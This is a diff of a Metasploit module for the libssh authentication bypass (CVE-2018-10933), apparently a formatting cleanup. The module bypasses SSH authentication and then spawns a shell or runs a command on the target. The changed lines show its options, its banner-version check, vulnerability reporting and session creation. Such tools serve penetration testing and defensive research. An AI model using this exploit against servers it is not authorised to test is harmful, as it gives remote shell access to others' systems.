@@ -13,54 +13,57 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::ReportSummary
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'libssh Authentication Bypass Scanner',
-      'Description'    => %q{
-        This module exploits an authentication bypass in libssh server code
-        where a USERAUTH_SUCCESS message is sent in place of the expected
-        USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and
-        0.8.0 through 0.8.3 are vulnerable.
+    super(
+      update_info(
+        info,
+        'Name' => 'libssh Authentication Bypass Scanner',
+        'Description' => %q{
+          This module exploits an authentication bypass in libssh server code
+          where a USERAUTH_SUCCESS message is sent in place of the expected
+          USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and
+          0.8.0 through 0.8.3 are vulnerable.
 
-        Note that this module's success depends on whether the server code
-        can trigger the correct (shell/exec) callbacks despite only the state
-        machine's authenticated state being set.
+          Note that this module's success depends on whether the server code
+          can trigger the correct (shell/exec) callbacks despite only the state
+          machine's authenticated state being set.
 
-        Therefore, you may or may not get a shell if the server requires
-        additional code paths to be followed.
-      },
-      'Author'         => [
-        'Peter Winter-Smith', # Discovery
-        'wvu'                 # Module
-      ],
-      'References'     => [
-        ['CVE', '2018-10933'],
-        ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
-      ],
-      'DisclosureDate' => '2018-10-16',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        ['Shell',   'Description' => 'Spawn a shell'],
-        ['Execute', 'Description' => 'Execute a command']
-      ],
-      'DefaultAction'  => 'Shell'
-    ))
+          Therefore, you may or may not get a shell if the server requires
+          additional code paths to be followed.
+        },
+        'Author' => [
+          'Peter Winter-Smith', # Discovery
+          'wvu'                 # Module
+        ],
+        'References' => [
+          ['CVE', '2018-10933'],
+          ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
+        ],
+        'DisclosureDate' => '2018-10-16',
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          ['Shell', { 'Description' => 'Spawn a shell' }],
+          ['Execute', { 'Description' => 'Execute a command' }]
+        ],
+        'DefaultAction' => 'Shell'
+      )
+    )
 
     register_options([
       Opt::RPORT(22),
-      OptString.new('CMD',        [false, 'Command or alternative shell']),
-      OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),
+      OptString.new('CMD', [false, 'Command or alternative shell']),
+      OptBool.new('SPAWN_PTY', [false, 'Spawn a PTY', false]),
       OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])
     ])
 
     register_advanced_options([
-      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
+      OptBool.new('SSH_DEBUG', [false, 'SSH debugging', false]),
       OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
     ])
   end
 
   # Vulnerable since 0.6.0 and patched in 0.7.6 and 0.8.4
   def check_banner(ip, version)
-    version =~ /libssh[_-]?([\d.]*)$/ && $1 && (v = Rex::Version.new($1))
+    version =~ /libssh[_-]?([\d.]*)$/ && ::Regexp.last_match(1) && (v = Rex::Version.new(::Regexp.last_match(1)))
 
     if v.nil?
       vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
@@ -84,10 +87,10 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     ssh_opts = ssh_client_defaults.merge({
-      port:            rport,
+      port: rport,
       # The auth method is converted into a class name for instantiation,
       # so libssh-auth-bypass here becomes LibsshAuthBypass from the mixin
-      auth_methods:    ['libssh-auth-bypass']
+      auth_methods: ['libssh-auth-bypass']
     })
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
@@ -110,13 +113,13 @@ class MetasploitModule < Msf::Auxiliary
     # XXX: The OOB authentication leads to false positives, so check banner
     if datastore['CHECK_BANNER']
       return if check_banner(ip, version) !=
-        (Exploit::CheckCode::Appears || Exploit::CheckCode::Detected)
+                (Exploit::CheckCode::Appears || Exploit::CheckCode::Detected)
     end
 
     report_vuln(
       host: ip,
-      name: self.name,
-      refs: self.references,
+      name: name,
+      refs: references,
       info: version
     )
 
@@ -134,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     case action.name
     when 'Shell'
       if datastore['CreateSession']
-        start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+        start_session(self, "#{name} (#{version})", {}, false, shell.lsock)
       end
     when 'Execute'
       output = shell.channel && (shell.channel[:data] || '').chomp
